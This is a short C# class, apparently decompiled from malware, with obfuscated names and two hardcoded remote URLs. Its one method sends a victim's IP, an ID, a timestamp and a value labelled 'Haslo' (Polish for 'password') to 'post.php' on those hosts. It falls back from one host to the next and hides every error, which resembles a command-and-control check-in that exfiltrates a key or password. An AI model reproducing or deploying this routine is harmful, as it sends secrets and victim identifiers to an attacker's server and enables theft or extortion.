using System;
using System.Net;

public static class GClass6
{
	private static int int_0 = 0;

	public static string[] string_0 = new string[2] { "http://kuchnia-marty.eu/ld/", "https://tanwjjjjilapl/mi5/" };

	public static string smethod_0(string string_1, string string_2, DateTime dateTime_0, string string_3)
	{
		string empty = string.Empty;
		int_0 = 0;
		try
		{
			string text = dateTime_0.ToString("dd-MM-yyyy HH:mm:ss");
			for (int i = 0; i < string_0.Length; i++)
			{
				if (!string.IsNullOrEmpty(string_0[int_0]))
				{
					try
					{
						WebClient webClient = new WebClient();
						Uri uri = new Uri(new Uri(string_0[int_0]), $"post.php?IP={string_1}&ID={string_2}&Data={text}&Haslo={string_3}");
						string absoluteUri = uri.AbsoluteUri;
						webClient.DownloadString(absoluteUri);
						int_0 = 0;
					}
					catch (Exception)
					{
						int_0++;
						continue;
					}
					break;
				}
			}
		}
		catch
		{
		}
		return empty;
	}
}
